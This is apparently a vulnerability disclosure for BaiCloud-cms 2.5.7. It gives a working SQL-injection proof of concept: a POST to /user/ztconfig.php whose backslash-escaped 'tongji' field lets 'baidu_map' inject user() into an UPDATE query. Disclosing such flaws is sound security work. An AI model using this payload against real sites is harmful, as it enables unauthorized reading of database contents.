### BaiCloud
BaiCloud-cms 2.5.7 /user/ztconfig.php SQL injection Vulnerability      

Link Url : https://github.com/meiko-S/BaiCloud         
            
Edition : lastest(2.5.7)

### 0x01 Vulnerability (/user/ztconfig.php line 65)
![image](https://user-images.githubusercontent.com/50347783/143538998-60be604f-3019-4020-957f-cab3f0ab02e6.png)
after user login then post data
```
POST /user/ztconfig.php
tongji=1\&baidu_map=,baidu_map=user()#&action=modify&bannerheight=1
```
then get /user/ztconfig.php page can get result
![image](https://user-images.githubusercontent.com/50347783/143538832-0d3306f4-8ee9-44f8-8684-b9e0d2a71b68.png)

### 0x20 Analysis
we set tongji = `1\` and baidu_map=`,baidu_map=user()#`
then the query is
```
update zzcms_usersetting set comanestyle='',comanecolor='',swf='',daohang='',bannerbg='',bannerheight='1',mobile='0',tongji='1\',baidu_map=',baidu_map=user()#' where username='admin';
```
this is a legal sql statement
![image](https://user-images.githubusercontent.com/50347783/143539581-dbfa7c06-cd93-48c9-8930-82f14c38eed4.png)
and when get this page,we can get this value.
